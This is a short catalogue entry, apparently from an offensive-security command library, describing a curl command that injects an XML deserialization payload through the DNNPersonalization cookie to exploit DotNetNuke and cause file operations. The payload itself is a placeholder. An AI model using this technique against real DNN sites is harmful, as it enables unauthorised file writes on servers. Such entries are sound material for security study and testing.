---
id: uuid-placeholder-c3
data: >-
  curl -v "https://target.com/nonexistent-page" -H "Cookie:
  DNNPersonalization=<xml-payload>"
tags:
  - exploit
  - deserialization
type: command
output: |-
  HTTP/1.1 404
  Body with potential reflection
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.211Z'
verified: false
validated: true
submitted: true
---
# curl-inject-payload

## Command

```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<xml-payload>"
```

## Description

Injects XML deserialization payload via cookie to exploit DNN.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Payload in cookie | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Cookie: DNNPersonalization=<profile>...</profile>" https://target.com/404
```

## Expected Output

404 with exploitation effects, e.g., file ops.

## Related

- [[Related Procedure: Inject-Crafted-Deserialization-Payload-for-File-Write]]
